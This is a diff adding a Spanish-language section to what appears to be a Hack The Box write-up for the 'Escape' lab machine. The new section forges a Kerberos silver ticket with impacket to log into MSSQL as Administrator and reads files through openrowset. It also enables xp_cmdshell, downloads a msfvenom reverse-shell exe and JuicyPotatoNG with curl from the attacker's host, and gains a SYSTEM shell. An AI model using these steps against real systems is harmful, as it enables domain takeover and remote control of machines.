@@ -1,4 +1,3 @@
-<!--
 <!DOCTYPE html>
 <html>
   <head>
@@ -128,6 +127,7 @@
         <li><a href="#shell-sql_svc">Shell - sql_svc</a></li>
         <li><a href="#shell-ryan_cooper">Shell - Ryan.Cooper</a></li>
         <li><a href="#shell-administrator">Shell - Administrator</a></li>
+        <li><a href="#altern-administrator">Alternativa - Administrator</a></li>
       </ul>
   </div>
 
@@ -588,6 +588,173 @@ PS C:\Users\Administrator\Documents></span>
 
 </section>
 
+<section class="post" id="altern-administrator">
+<br><h3 class="post-title">Alternativa - Administrator</h3><br>
+
+<p class="plain-text">Una alternativa ya que el usuario <code class="language-plaintext highlighter-rouge">sql_svc</code> se puede conectar a mssql es mediante un <code class="language-plaintext highlighter-rouge">silver ticket</code> suplantar al usuario <code class="language-plaintext highlighter-rouge">Administrator</code>, para ello necesitamos algunas cosas, iniciaremos por convertir nuestra contraseña en texto claro por un <code class="language-plaintext highlighter-rouge">hash NT</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo</span><span class="p"> -n REGGIE1234ronnie | </span><span class="ve">iconv</span><span class="p"> -t utf16le | </span><span class="ve">openssl </span><span class="p">md4  
+MD4(stdin)= 1443ec19da4dac4ffc953bca1b57b4cf</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ademas necesitamos el <code class="language-plaintext highlighter-rouge">SID</code> del dominio, este podemos conseguirlo con <code class="language-plaintext highlighter-rouge">getPac</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-getPac </span><span class="p">sequel.htb/sql_svc:REGGIE1234ronnie -targetUser sql_svc | </span><span class="ve">grep </span><span class="p">SID  
+Domain </span><span class="ro">SID</span><span class="p">: S-1-5-21-4078382237-1492182817-2568127209</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con esto haciendo uso de <code class="language-plaintext highlighter-rouge">ticketer</code> podemos solicitar un ticket bajo el <code class="language-plaintext highlighter-rouge">spn</code> <code class="language-plaintext highlighter-rouge">krbtgt/dc.sequel.htb</code> suplantando a <code class="language-plaintext highlighter-rouge">Administrator</code> en la autenticación a <code class="language-plaintext highlighter-rouge">mssql</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-ticketer </span><span class="p">-nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -dc-ip dc.sequel.htb -spn krbtgt/dc.sequel.htb Administrator  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for sequel.htb/Administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+
+</span><span class="ve">❯ export </span><span class="p">KRB5CCNAME=Administrator.ccache</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Utilizando el <code class="language-plaintext highlighter-rouge">ticket</code> como autenticación podemos conectarnos con <code class="language-plaintext highlighter-rouge">mssqlclient</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-mssqlclient </span><span class="p">dc.sequel.htb -k -no-pass
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
+[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.  
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al estar bajo el contexto de <code class="language-plaintext highlighter-rouge">Administrator</code> podemos leer archivos usando la funcion <code class="language-plaintext highlighter-rouge">bulkcolumn</code>, en este caso podemos apuntar a el archivo <code class="language-plaintext highlighter-rouge">root.txt</code> y ver la flag final</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select bulkcolumn from openrowset(bulk 'C:\Users\Administrator\Desktop\root.txt', single_clob) flag  
+
+bulkcolumn
+---------------------------------------------------------
+
+b'9c1**************************d44\r\n'
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Otra cosa que podemos hacer es habilitar el modulo <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> y ejecutar comandos, los ejecutamos como el usuario <code class="language-plaintext highlighter-rouge">sql_svc</code> que no parece ser importante</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> enable_xp_cmdshell
+[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.  
+[*] INFO(DC\SQLMOCK): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+</span><span class="p">SQL> xp_cmdshell whoami
+
+output
+--------------------------------------------------------------------------  
+
+sequel\sql_svc
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo <code class="language-plaintext highlighter-rouge">sql_svc</code> en el contexto de cuenta de servicio en <code class="language-plaintext highlighter-rouge">mssql</code> tiene otros privilegios diferentes a cuando nos conectamos por <code class="language-plaintext highlighter-rouge">winrm</code>, nos encontramos con <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> que nos permite <code class="language-plaintext highlighter-rouge">suplantar</code> a otros usuarios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_cmdshell whoami /priv
+
+output
+--------------------------------------------------------------------------  
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========  
+
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos por crear un archivo <code class="language-plaintext highlighter-rouge">exe</code> con <code class="language-plaintext highlighter-rouge">msfvenom</code> para que al ejecutarlo nos envie una <code class="language-plaintext highlighter-rouge">powershell</code> a nuestro host, e iniciamos un servidor http haciendo uso de python</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o shell.exe  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 1867 bytes
+Final size of exe file: 8192 bytes
+Saved as: shell.exe
+
+</span><span class="ve">❯ sudo python3</span><span class="p"> -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Desde <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> ademas de descargar el <code class="language-plaintext highlighter-rouge">exe</code> malicioso descargaremos <a href="https://github.com/antonioCoco/JuicyPotatoNG">JuicyPotatoNG.exe</a> en <code class="language-plaintext highlighter-rouge">C:\ProgramData</code> que nos servira para explotar el privilegio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_cmdshell curl 10.10.14.10/JuicyPotatoNG.exe -o C:\ProgramData\JuicyPotatoNG.exe  
+
+output
+--------------------------------------------------------------------------  
+
+SQL> xp_cmdshell curl 10.10.14.10/shell.exe -o C:\ProgramData\shell.exe
+
+output
+--------------------------------------------------------------------------
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora haciendo uso de <code class="language-plaintext highlighter-rouge">JuicyPotatoNG.exe</code> explotamos el privilegio suplantando al usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> y ejecutaremos el programa <code class="language-plaintext highlighter-rouge">shell.exe</code> que subimos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> xp_cmdshell C:\ProgramData\JuicyPotatoNG.exe -t * -p C:\ProgramData\shell.exe
+
+output
+--------------------------------------------------------------------------  
+
+	 JuicyPotatoNG
+	 by decoder_it & splinter_code
+
+[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247
+[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation  
+[+] CreateProcessAsUser OK
+[+] Exploit successful!
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como resultado recibimos la <code class="language-plaintext highlighter-rouge">powershell</code> como <code class="language-plaintext highlighter-rouge">nt authority\system</code> que es el usuario con maximos privilegios sobre el equipo, podemos simplemente leer la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.202
+Windows PowerShell running as user DC$ on DC
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt  
+9c1**************************d44
+PS C:\></span>
+</code></pre></div></div><br>
+
+</section>
+
 </article>
   </div>
   <footer class="footer">
@@ -600,4 +767,3 @@ PS C:\Users\Administrator\Documents></span>
     </div>
   </body>
 </html>
--->
